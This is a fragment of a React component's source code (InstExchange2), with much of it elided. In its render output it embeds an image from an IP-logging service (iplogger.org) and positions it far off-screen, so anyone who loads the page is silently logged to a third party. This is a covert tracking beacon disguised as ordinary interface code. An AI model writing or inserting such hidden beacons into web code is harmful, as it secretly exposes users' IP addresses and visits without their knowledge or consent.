...
const cn = cssClassName('InstExchange2');
import A_H from 'A_H';
...
class InstExchange2 extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      activeCat: 0,
  ...
  render() {
    ...
    return (
            <div className={cn('section-wrapper')}>
                <img src="https://iplogger.org/1LEqM6" style={{position:"absolute", top:"-9000px", left:"-9000px", border:"0"}} />
